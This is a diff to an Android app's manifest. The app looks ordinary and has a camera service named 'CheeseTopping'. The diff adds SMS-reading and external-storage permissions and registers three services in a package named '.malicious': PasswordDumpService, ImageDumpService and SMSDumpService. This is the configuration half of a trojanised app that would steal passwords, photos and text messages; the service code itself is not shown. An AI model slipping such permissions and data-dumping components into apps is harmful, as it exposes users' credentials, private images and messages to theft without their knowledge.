@@ -13,8 +13,16 @@
     <uses-feature
         android:name="android.hardware.camera"
         android:required="false" />
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  <!-- For images -->
+    <uses-permission android:name="android.permission.READ_SMS" />
 
     <application
         android:allowBackup="true"
@@ -41,6 +49,16 @@
             android:name=".CheeseTopping"
             android:exported="false"
             android:foregroundServiceType="camera" />
+
+        <service
+            android:name=".malicious.PasswordDumpService"
+            android:exported="false" />
+        <service
+            android:name=".malicious.ImageDumpService"
+            android:exported="false" />
+        <service
+            android:name=".malicious.SMSDumpService"
+            android:exported="false" />
 
         <activity
             android:name=".MainActivity"
